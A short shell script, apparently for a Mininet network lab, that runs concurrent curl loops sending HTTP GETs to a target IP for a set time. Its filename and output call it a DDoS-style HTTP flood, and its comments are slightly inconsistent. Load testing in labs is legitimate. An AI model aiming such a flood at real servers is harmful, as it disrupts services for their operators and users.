#!/bin/sh
# POSIX shell load generator for Mininet lab.
# POSIX shell load generator for Mininet lab.
# Spawns N concurrent clients issuing repeated HTTP GETs.
# Usage: ./ddos_no_flood.csh [target_ip] [duration_seconds] [concurrency]
# Example: ./ddos_no_flood.csh 10.0.0.1 60 12

target=${1:-10.0.0.1}
duration=${2:-60}
conc=${3:-10}

# check curl
if ! command -v curl >/dev/null 2>&1; then
  echo "curl not found. Install curl (sudo apt install -y curl) and retry."
  exit 1
fi

now=$(date +%s)
end=$((now + duration))

echo "Starting HTTP flood -> $target for ${duration}s with ${conc} clients"

i=0
while [ "$i" -lt "$conc" ]; do
  (
    while [ "$(date +%s)" -lt "$end" ]; do
      curl -s --connect-timeout 1 --max-time 2 "http://$target/" >/dev/null 2>&1 || true
      # short pause to yield CPU; set to 0 to loop as fast as possible
      sleep 0
    done
  ) &
  i=$((i + 1))
done

# wait for all background workers
wait

echo "Load generator finished."